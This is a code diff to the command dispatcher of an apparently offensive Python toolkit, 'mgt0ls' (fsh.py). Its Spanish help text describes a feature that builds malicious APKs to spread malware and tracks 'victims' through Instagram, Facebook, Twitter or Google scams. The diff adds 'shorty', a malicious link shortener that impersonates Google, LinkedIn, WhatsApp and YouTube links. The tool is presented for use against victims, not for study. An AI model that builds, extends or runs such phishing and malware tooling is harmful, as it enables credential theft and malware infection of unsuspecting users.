@@ -138,7 +138,7 @@ execute_s = {
         "[DESCRIPCION]\nGenera APK maliciosos para propagar malware.\n\n"
         "[USO]\npython3 fsh.py sc4pk --a <ID_de_seguimiento> --b <ig|fb|tw|go> | Creacion del APK.\n"
         "python3 fsh.py sc4pk --a <ID_de_seguimiento> | Busqueda de victimas.\n\n"
-        "[PARAMETROS]\n--a: ID asociada a tus victimas (obligatorio).\n"
+        "[PARAMETROS]\n--a: ID asociada a tus victimas, (obligatorio).\n"
         "--b: Scam a usar (ig para Instagram, fb para Facebook, tw para Twitter, go para Google, opcional)",
         "mal"
     ],
@@ -171,6 +171,16 @@ execute_s = {
         "[DESCRIPCION]\nVerifica si es que mgt0ls esta actualizado.\n\n"
         "[USO]\npython3 fsh.py update",
         "cmd"
+    ],
+    "shorty": [
+        shorty,
+        "abc",
+        "[DESCRIPCION]\nAcortador de enlaces maliciosos.\n\n"
+        "[USO]\npython3 fsh.py shorty --a <GOO|LIN|WHA|YOU|RID|TIN> --b <URL> --c <ALIAS>\n\n"
+        "[PARAMETROS]\n--a Suplantar plataforma (GOO para Google, LIN para Linkedin, WHA para WhatsApp, YOU para YouTube, RID para Ride.ee, TIN para Tin.al, obligatorio)."
+        "--b URL a acortar, (obligatorio)."
+        "--c Alias para el enlace acortado, (opcional).",
+        "vec"
     ]
 }
 
@@ -265,5 +275,8 @@ try:
     else:
         print(translate("[ERROR] Funcion no encontrada ..."))
 
+except TypeError:
+    print(translate(f"[ERROR] No colocaste todos los parametros en {arguments.tool} ..."))
+
 except Exception as err:
-    print(err)
+    print(translate(f"[ERROR] {err}"))
